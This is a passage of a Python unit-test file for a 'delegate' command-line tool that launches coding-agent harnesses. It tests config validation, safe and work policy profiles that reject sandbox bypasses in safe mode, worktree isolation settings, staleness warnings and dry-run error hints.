                code = cli.main(["--cwd", tmp, "--json", "models"], stdout=stdout, stderr=stderr)
            self.assertEqual(code, error_types.EXIT_OK, stderr.getvalue())
            self.assertEqual(
                json.loads(stdout.getvalue())["cursor"]["defaultModel"], "composer-2.5"
            )

    def test_load_config_uses_private_embedded_default_copy(self):
        config_mod = load_config_module()
        cfg = config_mod.embedded_default_config()
        cfg["cursor"]["argvPrefix"].append("mutated")
        self.assertNotIn("mutated", config_mod.embedded_default_config()["cursor"]["argvPrefix"])

        with tempfile.TemporaryDirectory() as tmp:
            missing_global = Path(tmp) / "missing.json"
            config_mod.DEFAULT_CONFIG["cursor"]["defaultModel"] = "mutated-public"
            with (
                mock.patch.object(config_mod, "DEFAULT_CONFIG_PATH", missing_global),
                mock.patch.dict(os.environ, {}, clear=True),
            ):
                loaded, source = config_mod.load_config()

        self.assertEqual(source, "embedded-default")
        self.assertEqual(loaded["cursor"]["defaultModel"], "composer-2.5")

    def test_policy_default_profile_safe_resolves_work_network(self):
        config_mod = load_config_module()
        policy = config_mod.effective_policy(
            config_mod.DEFAULT_CONFIG,
            engine="codex",
            mode="work",
        )
        self.assertTrue(policy["networkAccess"])
        self.assertNotIn("approvalPolicy", policy)
        self.assertFalse(policy["bypassApprovalsAndSandbox"])
        self.assertFalse(policy["bypassHookTrust"])

    def test_policy_default_profile_safe_resolves_safe_no_network_or_bypasses(self):
        config_mod = load_config_module()
        policy = config_mod.effective_policy(
            config_mod.DEFAULT_CONFIG,
            engine="codex",
            mode="safe",
        )
        self.assertFalse(policy["networkAccess"])
        self.assertFalse(policy["webSearch"])
        self.assertFalse(policy["bypassApprovalsAndSandbox"])
        self.assertFalse(policy["bypassHookTrust"])

    def test_policy_rejects_approval_policy_field(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError):
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"policy": {"work": {"approvalPolicy": "on-request"}}},
                )
            )

    def test_codex_config_rejects_null_section(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"codex": None},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_codex_config")

    def test_reasoning_config_rejects_empty_effort_level(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["reasoning"] = {
            "capabilities": {
                "droid": {
                    "custom:x": {
                        "supported": [""],
                        "default": "",
                    }
                }
            }
        }
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_reasoning_config")

    def test_reasoning_capabilities_reject_unknown_harness_keys(self):
        # Declarations for harnesses that never consult the table (cursor,
        # typos) must fail loudly instead of validating and being ignored.
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["reasoning"] = {
            "capabilities": {
                "cursor": {"sonnet-thinking": {"supported": ["high"]}},
            }
        }
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_reasoning_config")
        self.assertIn("cursor.reasoningEffortModels", ctx.exception.message)

    def test_reasoning_capabilities_accept_grok_model_declarations(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["reasoning"] = {
            "capabilities": {
                "grok": {
                    "future-grok": {
                        "supported": ["low", "high", "max"],
                        "default": "high",
                    }
                }
            }
        }
        config_mod.validate_config(config)

    def test_cursor_reasoning_effort_models_must_be_strings(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["cursor"]["reasoningEffortModels"] = {"high": 123}
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_cursor_config")

    def test_provider_default_reasoning_effort_must_be_string_or_null(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["codex"]["defaultReasoningEffort"] = 1
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_codex_config")

    def test_provider_default_reasoning_effort_rejects_whitespace(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["droid"]["defaultReasoningEffort"] = "high effort"
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_droid_config")

    def test_harness_enum_defaults_allow_future_transport_safe_efforts(self):
        config_mod = load_config_module()
        for engine in ("claude", "grok"):
            with self.subTest(engine=engine):
                config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
                config[engine]["defaultReasoningEffort"] = "future-level"
                config_mod.validate_config(config)

    def test_cursor_reasoning_effort_model_keys_reject_whitespace(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["cursor"]["reasoningEffortModels"] = {" high": "sonnet-thinking"}
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_cursor_config")

    def test_existing_config_without_reasoning_fields_still_validates(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config.pop("reasoning", None)
        config["codex"].pop("defaultReasoningEffort", None)
        config["droid"].pop("defaultReasoningEffort", None)
        config["cursor"].pop("defaultReasoningEffort", None)
        config["cursor"].pop("reasoningEffortModels", None)
        config_mod.validate_config(config)

    def test_policy_trusted_hooks_profile_enables_codex_work_hook_bypass(self):
        config_mod = load_config_module()
        loaded = config_mod.deep_merge(
            config_mod.DEFAULT_CONFIG,
            {"policy": {"profile": "trusted-hooks"}},
        )
        policy = config_mod.effective_policy(loaded, engine="codex", mode="work")
        self.assertTrue(policy["networkAccess"])
        self.assertTrue(policy["bypassHookTrust"])
        self.assertFalse(policy["bypassApprovalsAndSandbox"])

    def test_policy_external_sandbox_profile_enables_full_codex_work_bypass(self):
        config_mod = load_config_module()
        loaded = config_mod.deep_merge(
            config_mod.DEFAULT_CONFIG,
            {"policy": {"profile": "external-sandbox"}},
        )
        policy = config_mod.effective_policy(loaded, engine="codex", mode="work")
        self.assertTrue(policy["bypassApprovalsAndSandbox"])
        self.assertTrue(policy["bypassHookTrust"])

    def test_policy_explicit_mode_override_beats_profile_defaults(self):
        config_mod = load_config_module()
        loaded = config_mod.deep_merge(
            config_mod.DEFAULT_CONFIG,
            {
                "policy": {
                    "profile": "trusted-hooks",
                    "work": {"bypassHookTrust": False},
                }
            },
        )
        policy = config_mod.effective_policy(loaded, engine="codex", mode="work")
        self.assertFalse(policy["bypassHookTrust"])

    def test_policy_harness_override_beats_explicit_mode_policy(self):
        config_mod = load_config_module()
        loaded = config_mod.deep_merge(
            config_mod.DEFAULT_CONFIG,
            {
                "policy": {
                    "work": {"networkAccess": True, "bypassHookTrust": False},
                    "harness": {
                        "codex": {"work": {"bypassHookTrust": True}},
                        "cursor": {"work": {"networkAccess": False}},
                    },
                }
            },
        )
        codex_policy = config_mod.effective_policy(loaded, engine="codex", mode="work")
        self.assertTrue(codex_policy["bypassHookTrust"])
        self.assertTrue(codex_policy["networkAccess"])
        cursor_policy = config_mod.effective_policy(loaded, engine="cursor", mode="work")
        self.assertFalse(cursor_policy["networkAccess"])
        self.assertFalse(cursor_policy["bypassHookTrust"])
        droid_policy = config_mod.effective_policy(loaded, engine="droid", mode="work")
        self.assertTrue(droid_policy["networkAccess"])
        self.assertFalse(droid_policy["bypassHookTrust"])

    def test_policy_safe_rejects_bypass_approvals_and_sandbox(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"policy": {"safe": {"bypassApprovalsAndSandbox": True}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_policy_config")

    def test_policy_safe_rejects_bypass_hook_trust(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"policy": {"safe": {"bypassHookTrust": True}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_policy_config")

    def test_policy_harness_safe_rejects_bypass(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {
                        "policy": {
                            "harness": {"codex": {"safe": {"bypassApprovalsAndSandbox": True}}}
                        }
                    },
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_policy_config")

    def test_policy_safe_allows_bypass_false(self):
        config_mod = load_config_module()
        # Explicitly disabling a bypass under safe mode is fine — only enabling is rejected.
        config_mod.validate_config(
            config_mod.deep_merge(
                config_mod.DEFAULT_CONFIG,
                {"policy": {"safe": {"bypassApprovalsAndSandbox": False}}},
            )
        )

    def test_isolation_config_non_object_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(config_mod.DEFAULT_CONFIG, {"isolation": "bananas"})
            )
        self.assertEqual(ctx.exception.error, "invalid_isolation_config")

    def test_isolation_safe_unknown_value_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"isolation": {"safe": "bananas"}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_isolation_config")

    def test_safe_isolation_warnings_cover_both_directions(self):
        """Safe isolation warnings describe explicit overrides after normalization."""
        from delegate_agent.request_build import _safe_isolation_warnings as warn

        normalized = warn(
            engine="codex", mode="safe", requested="none", effective="auto", source_path="/repo"
        )
        self.assertEqual(len(normalized), 1)
        self.assertIn("using auto", normalized[0])

        overridden = warn(engine="claude", mode="safe", requested="none", effective="auto")
        self.assertEqual(len(overridden), 1)
        self.assertIn("using auto", overridden[0])

        # Silence is only correct where the reader's assumption already holds.
        self.assertEqual(warn(engine="codex", mode="safe", requested=None, effective="auto"), ())
        self.assertEqual(
            warn(engine="codex", mode="safe", requested="worktree", effective="worktree"), ()
        )
        # Work mode edits the real tree by contract, so it is not a surprise.
        self.assertEqual(warn(engine="codex", mode="work", requested="none", effective="none"), ())

    def test_worktrees_config_non_object_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(config_mod.DEFAULT_CONFIG, {"worktrees": "nope"})
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")

    def test_worktrees_data_home_empty_string_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"dataHome": ""}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")

    def test_worktrees_data_home_relative_path_raises(self):
        config_mod = load_config_module()
        for value in ("relative/path", "./relative"):
            with self.subTest(value=value):
                with self.assertRaises(config_mod.ConfigError) as ctx:
                    config_mod.validate_config(
                        config_mod.deep_merge(
                            config_mod.DEFAULT_CONFIG,
                            {"worktrees": {"dataHome": value}},
                        )
                    )
                self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
                self.assertIn("absolute path", ctx.exception.message)

    def test_worktrees_auto_prune_enabled_not_bool_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"autoPrune": {"enabled": "yes"}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
        self.assertIn("enabled", ctx.exception.message)

    def test_worktrees_auto_prune_merged_negative_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"autoPrune": {"mergedOlderThanDays": -1}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
        self.assertIn("mergedOlderThanDays", ctx.exception.message)

    def test_worktrees_pool_warn_count_rejects_bad_values(self):
        config_mod = load_config_module()
        for value in (None, -1, True, "1024"):
            with self.subTest(value=value):
                with self.assertRaises(config_mod.ConfigError) as ctx:
                    config_mod.validate_config(
                        config_mod.deep_merge(
                            config_mod.DEFAULT_CONFIG,
                            {"worktrees": {"poolWarnCount": value}},
                        )
                    )
                self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
                self.assertIn("poolWarnCount", ctx.exception.message)

    def test_worktrees_retire_worktree_on_completion_must_be_bool(self):
        config_mod = load_config_module()
        for value in (None, 0, "yes"):
            with self.subTest(value=value):
                with self.assertRaises(config_mod.ConfigError) as ctx:
                    config_mod.validate_config(
                        config_mod.deep_merge(
                            config_mod.DEFAULT_CONFIG,
                            {"worktrees": {"retireWorktreeOnCompletion": value}},
                        )
                    )
                self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
                self.assertIn("retireWorktreeOnCompletion", ctx.exception.message)

    def test_worktrees_retire_worktree_on_completion_defaults_on(self):
        config_mod = load_config_module()
        self.assertIs(
            config_mod.embedded_default_config()["worktrees"]["retireWorktreeOnCompletion"], True
        )

    def test_isolation_and_worktrees_valid_does_not_raise(self):
        config_mod = load_config_module()
        config_mod.validate_config(
            config_mod.deep_merge(
                config_mod.DEFAULT_CONFIG,
                {
                    "isolation": {"safe": "worktree", "work": "auto"},
                    "worktrees": {
                        "dataHome": "/custom/path",
                        "autoPrune": {"enabled": True, "mergedOlderThanDays": 30},
                    },
                },
            )
        )

    def test_isolation_missing_uses_embedded_defaults(self):
        config_mod = load_config_module()
        cfg = config_mod.deep_merge(config_mod.DEFAULT_CONFIG, {})
        self.assertEqual(cfg["isolation"]["safe"], "auto")
        self.assertEqual(cfg["isolation"]["work"], "none")

    def test_isolation_work_unknown_value_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"isolation": {"work": "bananas"}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_isolation_config")

    def test_isolation_safe_explicit_null_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"isolation": {"safe": None}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_isolation_config")
        self.assertIn("null", ctx.exception.message)

    def test_isolation_work_explicit_null_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"isolation": {"work": None}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_isolation_config")
        self.assertIn("null", ctx.exception.message)

    def test_worktrees_auto_prune_enabled_explicit_null_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"autoPrune": {"enabled": None}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
        self.assertIn("enabled", ctx.exception.message)
        self.assertIn("null", ctx.exception.message)

    def test_worktrees_auto_prune_merged_days_explicit_null_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"autoPrune": {"mergedOlderThanDays": None}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
        self.assertIn("mergedOlderThanDays", ctx.exception.message)
        self.assertIn("null", ctx.exception.message)

    def test_worktrees_auto_prune_merged_days_string_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"autoPrune": {"mergedOlderThanDays": "7"}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
        self.assertIn("mergedOlderThanDays", ctx.exception.message)

    def test_worktrees_auto_prune_merged_days_bool_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"worktrees": {"autoPrune": {"mergedOlderThanDays": True}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_worktrees_config")
        self.assertIn("mergedOlderThanDays", ctx.exception.message)

    def test_tracking_retention_raw_log_days_bool_raises(self):
        config_mod = load_config_module()
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(
                config_mod.deep_merge(
                    config_mod.DEFAULT_CONFIG,
                    {"tracking": {"retention": {"rawLogDays": False}}},
                )
            )
        self.assertEqual(ctx.exception.error, "invalid_tracking_config")
        self.assertIn("rawLogDays", ctx.exception.message)

    def test_tracking_process_group_grace_resolves_and_accepts_zero(self):
        config_mod = load_config_module()
        config = config_mod.deep_merge(
            config_mod.DEFAULT_CONFIG,
            {"tracking": {"processGroupTerminationGraceSec": 0}},
        )
        config_mod.validate_config(config)
        self.assertEqual(config_mod.resolve_process_group_termination_grace_sec(config), 0.0)

    def test_request_carries_configured_process_group_grace(self):
        config = json.loads(json.dumps(DEFAULT_CONFIG))
        config["tracking"]["processGroupTerminationGraceSec"] = 0.25
        parsed = parser_api.parse_cli(["codex", "safe", "review"])
        request = request_api.request_from_parsed(parsed, config, io.StringIO(""))
        self.assertEqual(request.process_group_termination_grace_sec, 0.25)

    def test_tracking_process_group_grace_rejects_negative_or_non_numeric(self):
        config_mod = load_config_module()
        for value in (-1, True, "1", float("inf")):
            with self.subTest(value=value), self.assertRaises(config_mod.ConfigError) as ctx:
                config_mod.validate_config(
                    config_mod.deep_merge(
                        config_mod.DEFAULT_CONFIG,
                        {"tracking": {"processGroupTerminationGraceSec": value}},
                    )
                )
            self.assertEqual(ctx.exception.error, "invalid_tracking_config")
            self.assertIn("processGroupTerminationGraceSec", ctx.exception.message)

    def test_worktrees_data_home_explicit_null_accepted(self):
        """dataHome: null is the valid explicit default sentinel."""
        config_mod = load_config_module()
        config_mod.validate_config(
            config_mod.deep_merge(
                config_mod.DEFAULT_CONFIG,
                {"worktrees": {"dataHome": None}},
            )
        )

    def test_resolve_isolation_loaded_config_isolation_not_dict_raises(self):
        """resolve_isolation raises when loaded_config isolation is a string, not dict."""
        config_mod = load_config_module()
        with self.assertRaises(config_mod.InvalidIsolationError) as ctx:
            config_mod.resolve_isolation(
                cli_value=None,
                input_json_value=None,
                loaded_config={"isolation": "bad"},
                engine="cursor",
                mode="work",
            )
        self.assertIn("must be an object", str(ctx.exception).lower())

    def test_resolve_isolation_loaded_config_isolation_mode_none_raises(self):
        """resolve_isolation raises when loaded_config isolation.work is explicit null."""
        config_mod = load_config_module()
        with self.assertRaises(config_mod.InvalidIsolationError) as ctx:
            config_mod.resolve_isolation(
                cli_value=None,
                input_json_value=None,
                loaded_config={"isolation": {"work": None}},
                engine="cursor",
                mode="work",
            )
        self.assertIn("must not be null", str(ctx.exception).lower())

    def test_resolve_isolation_loaded_config_isolation_mode_invalid_raises(self):
        """resolve_isolation raises when loaded_config isolation.work is invalid string."""
        config_mod = load_config_module()
        with self.assertRaises(config_mod.InvalidIsolationError) as ctx:
            config_mod.resolve_isolation(
                cli_value=None,
                input_json_value=None,
                loaded_config={"isolation": {"work": "bananas"}},
                engine="cursor",
                mode="work",
            )
        self.assertIn("must be one of", str(ctx.exception).lower())

    def test_resolve_isolation_normalizes_safe_none_for_isolation_required_harnesses(self):
        config_mod = load_config_module()
        for engine in (
            "codex",
            "cursor",
            "droid",
            "kimi",
            "claude",
            "grok",
            "devin",
            "opencode",
            "pi",
            "omp",
        ):
            with self.subTest(engine=engine):
                self.assertEqual(
                    config_mod.resolve_isolation(
                        cli_value="none",
                        loaded_config=config_mod.DEFAULT_CONFIG,
                        engine=engine,
                        mode="safe",
                    ),
                    "auto",
                )

    def test_resolve_isolation_normalizes_input_json_safe_none_for_droid(self):
        config_mod = load_config_module()
        for engine in ("codex", "droid"):
            with self.subTest(engine=engine):
                self.assertEqual(
                    config_mod.resolve_isolation(
                        input_json_value="none",
                        loaded_config=config_mod.DEFAULT_CONFIG,
                        engine=engine,
                        mode="safe",
                    ),
                    "auto",
                )

    def test_resolve_isolation_normalizes_config_safe_none_for_kimi(self):
        config_mod = load_config_module()
        for engine in ("codex", "kimi"):
            with self.subTest(engine=engine):
                self.assertEqual(
                    config_mod.resolve_isolation(
                        loaded_config={"isolation": {"safe": "none"}},
                        engine=engine,
                        mode="safe",
                    ),
                    "auto",
                )

    def test_resolve_isolation_normalizes_codex_safe_none_but_allows_work_none(self):
        config_mod = load_config_module()
        self.assertEqual(
            config_mod.resolve_isolation(
                cli_value="none",
                loaded_config=config_mod.DEFAULT_CONFIG,
                engine="codex",
                mode="safe",
            ),
            "auto",
        )
        self.assertEqual(
            config_mod.resolve_isolation(
                cli_value="none",
                loaded_config=config_mod.DEFAULT_CONFIG,
                engine="droid",
                mode="work",
            ),
            "none",
        )

    def test_kimi_config_section_valid(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["kimi"] = {
            "binary": "kimi",
            "defaultModel": "kimi-code/kimi-for-coding",
            "defaultReasoningEffort": None,
        }
        config_mod.validate_config(config)

    def test_kimi_config_rejects_non_string_binary(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["kimi"]["binary"] = 123
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_kimi_config")
        self.assertIn("binary", ctx.exception.message)

    def test_kimi_config_rejects_empty_binary(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["kimi"]["binary"] = ""
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_kimi_config")
        self.assertIn("binary", ctx.exception.message)

    def test_kimi_config_rejects_invalid_default_model(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["kimi"]["defaultModel"] = 123
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_kimi_config")
        self.assertIn("defaultModel", ctx.exception.message)

    def test_kimi_config_rejects_non_null_default_reasoning_effort(self):
        config_mod = load_config_module()
        config = copy.deepcopy(config_mod.DEFAULT_CONFIG)
        config["kimi"]["defaultReasoningEffort"] = "high"
        with self.assertRaises(config_mod.ConfigError) as ctx:
            config_mod.validate_config(config)
        self.assertEqual(ctx.exception.error, "invalid_kimi_config")
        self.assertIn("defaultReasoningEffort", ctx.exception.message)

    def test_request_from_input_json_explicit_null_isolation_raises(self):
        """Direct call to request_from_input_json with isolation: null raises."""
        delegate = load_delegate()
        with tempfile.TemporaryDirectory() as tmp:
            task = Path(tmp) / "task.json"
            task.write_text(
                json.dumps(
                    {
                        "engine": "droid",
                        "mode": "safe",
                        "model": "minimax",
                        "cwd": tmp,
                        "prompt": "hello",
                        "isolation": None,
                    }
                )
            )
            parsed = request_types.ParsedCommand(
                "run",
                global_options=request_types.GlobalOptions(json_mode=True),
                payload=request_types.RunJsonOptions(str(task)),
            )
            with self.assertRaises(error_types.DelegateError) as ctx:
                request_api.request_from_input_json(parsed, droid_test_config(delegate))
            self.assertEqual(ctx.exception.error, "invalid_isolation")
            self.assertIn("null", ctx.exception.message.lower())

    def test_input_json_forbid_commit_implies_worktree_isolation(self):
        """run --input-json with forbidCommit: true and no isolation gets the
        same implied worktree isolation + note as the CLI path."""
        delegate = load_delegate()
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        task = Path(repo.name) / "task.json"
        task.write_text(
            json.dumps(
                {
                    "engine": "droid",
                    "mode": "work",
                    "model": "minimax",
                    "cwd": repo.name,
                    "prompt": "fix it",
                    "forbidCommit": True,
                }
            )
        )
        parsed = request_types.ParsedCommand(
            "run",
            global_options=request_types.GlobalOptions(json_mode=True),
            payload=request_types.RunJsonOptions(str(task)),
        )
        request = request_api.request_from_input_json(parsed, droid_test_config(delegate))
        # Implied worktree isolation.
        self.assertIsNotNone(request.isolation_context)
        self.assertEqual(request.isolation_context.effective_isolation, "worktree")
        self.assertEqual(request.isolation_context.isolation_lifecycle, "persistent")
        self.assertTrue(request.forbid_commit)
        # The note is present.
        self.assertIn(
            "note: --forbid-commit implies --isolation worktree",
            " ".join(request.warnings),
        )

    def test_input_json_forbid_commit_with_explicit_none_errors(self):
        """run --input-json with forbidCommit: true and isolation: 'none' errors."""
        delegate = load_delegate()
        repo = make_git_repo()
        self.addCleanup(repo.cleanup)
        task = Path(repo.name) / "task.json"
        task.write_text(
            json.dumps(
                {
                    "engine": "droid",
                    "mode": "work",
                    "model": "minimax",
                    "cwd": repo.name,
                    "prompt": "fix it",
                    "forbidCommit": True,
                    "isolation": "none",
                }
            )
        )
        parsed = request_types.ParsedCommand(
            "run",
            global_options=request_types.GlobalOptions(json_mode=True),
            payload=request_types.RunJsonOptions(str(task)),
        )
        with self.assertRaises(error_types.DelegateError) as ctx:
            request_api.request_from_input_json(parsed, droid_test_config(delegate))
        self.assertEqual(ctx.exception.error, "invalid_option_combination")
        self.assertIn("none", ctx.exception.message.lower())


class WorktreeStalenessWarningTests(unittest.TestCase):
    """A worktree snapshots its base at launch; the source keeps moving.

    A reviewer lane dispatched before a contract fix reviews the tree without it
    and returns a confident verdict about a document that no longer exists in
    that form. The count was already in the work summary and nothing surfaced it.
    """

    def test_only_a_positive_behind_count_warns(self):
        from delegate_agent.runner import _source_commits_missed as missed

        self.assertEqual(missed({"branchAheadOfSource": {"behind": 3, "ahead": 1}}), 3)
        # Zero is the ordinary case and must stay silent, or the warning becomes
        # noise on every run and gets ignored exactly when it matters.
        self.assertIsNone(missed({"branchAheadOfSource": {"behind": 0, "ahead": 2}}))
        # Absence of the field is not evidence of zero drift.
        self.assertIsNone(missed({"baseCommit": "abc123"}))
        self.assertIsNone(missed({"branchAheadOfSource": None}))
        self.assertIsNone(missed({"branchAheadOfSource": {"behind": "3"}}))
        self.assertIsNone(missed(None))

    def test_the_warning_names_the_count_and_the_consequence(self):
        from delegate_agent import runner

        ctx = mock.Mock()
        ctx.isolation_lifecycle = "persistent"
        ctx.forbid_commit = False
        ctx.worktree_attachment = None
        summary = {
            "branchAheadOfSource": {"behind": 4, "ahead": 0},
            "noChanges": False,
            "commitsCreatedCount": 0,
        }
        with mock.patch.object(runner, "_persistent_work_summary", return_value=summary):
            _, extra = runner._final_extra(ctx, 0)
        warnings = extra.get("warnings") or []
        self.assertTrue(
            any("4 commit(s) behind" in warning for warning in warnings),
            f"the count must be named, got: {warnings}",
        )
        self.assertTrue(
            any("never saw work that landed after it was dispatched" in w for w in warnings),
            f"the consequence must be named, got: {warnings}",
        )

    def test_a_current_worktree_warns_about_nothing(self):
        from delegate_agent import runner

        ctx = mock.Mock()
        ctx.isolation_lifecycle = "persistent"
        ctx.forbid_commit = False
        ctx.worktree_attachment = None
        summary = {
            "branchAheadOfSource": {"behind": 0, "ahead": 1},
            "noChanges": False,
            "commitsCreatedCount": 0,
        }
        with mock.patch.object(runner, "_persistent_work_summary", return_value=summary):
            _, extra = runner._final_extra(ctx, 0)
        warnings = extra.get("warnings") or []
        self.assertFalse(
            any("behind the source branch" in warning for warning in warnings),
            f"a current worktree must not warn, got: {warnings}",
        )


class DryRunHintScopeTests(unittest.TestCase):
    """`delegate dry-run` advice must only appear where it is a thing to type.

    Appending it to every option error was wrong twice: `delegate dry-run runs`
    does not exist, and it fired at callers who had already typed `dry-run`.
    """

    def setUp(self):
        self.delegate = load_delegate()

    def _message(self, argv):
        with self.assertRaises(error_types.DelegateError) as ctx:
            parser_api.parse_cli(argv)
        return ctx.exception.message

    def test_a_launch_error_names_dry_run(self):
        message = self._message(["--isolation", "none", "codex", "work", "--forbid-commit", "fix"])
        self.assertIn("dry-run", message)
        self.assertIn("Validate without launching", message)

    def test_a_dry_run_error_does_not_tell_you_to_dry_run(self):
        message = self._message(
            ["--isolation", "none", "dry-run", "codex", "work", "--forbid-commit", "fix"]
        )
        self.assertNotIn("prefix it with", message)

    def test_a_dry_run_correction_stays_a_dry_run(self):
        """The correction must not silently convert a validation into a launch."""
        message = self._message(
            ["--isolation", "none", "dry-run", "codex", "work", "--forbid-commit", "fix"]
        )
        corrected = message.split("Corrected command: ", 1)[1].split(". ", 1)[0].removesuffix(".")
        self.assertIn(" dry-run ", f" {corrected} ")
        argv = corrected.split()
        self.assertEqual(argv[0], "delegate")
        reparsed = parser_api.parse_cli(argv[1:])
        self.assertEqual(reparsed.subcommand, "codex")
        self.assertTrue(reparsed.payload.dry_run)

    def test_a_non_launch_error_is_not_told_to_use_a_launch_only_verb(self):
        message = self._message(["--notify", "channel:x", "runs"])
        self.assertNotIn("delegate dry-run", message)
